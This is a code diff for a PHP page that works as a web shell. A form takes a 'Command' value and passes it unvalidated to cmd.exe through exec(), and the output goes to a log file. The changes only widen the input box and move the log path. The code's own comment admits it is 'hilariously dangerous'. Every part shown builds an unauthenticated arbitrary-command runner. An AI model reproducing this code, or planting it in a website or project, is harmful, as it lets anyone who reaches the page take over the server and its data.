@@ -10,7 +10,7 @@ if (!isset($_POST["Submit"])) { // If page is not submitted to self echo form.
 		 	</head>
 		 	<body>
 		 	<form method=\"post\" action=\"$PHP_SELF\">
-  		 	C:\>&nbsp&nbsp&nbsp<input type=\"text\" size=\"40\" maxlength=\"120\" name=\"Command\"/><br />
+  		 	C:\>&nbsp&nbsp&nbsp<input type=\"text\" size=\"50\" maxlength=\"120\" name=\"Command\"/><br />
   		 	<input type=\"Submit\" value=\" Run \" name=\"Submit\"/>
  		 	</form>
   		 	</body>"
@@ -18,7 +18,7 @@ if (!isset($_POST["Submit"])) { // If page is not submitted to self echo form.
   
 }else{ // Run as if from the windows command prompt, end after - output in textfile (needs to be system writable).
 	
-  		exec("cd\ & c: & cmd.exe /c $Command >" . $_SERVER["DOCUMENT_ROOT"] . "\outputlog.txt 2>&1");  // No validation - hilariously dangerous!
+  		exec("cd\ & c: & cmd.exe /c $Command >" . dirname(__FILE__) . "\outputlog.txt 2>&1");  // No validation - hilariously dangerous!
 	
 	print ( // Display the results of the command line by line - display new command button (just a browser back, a cheat to get the previous command to populate without work).
  		 	"<head>
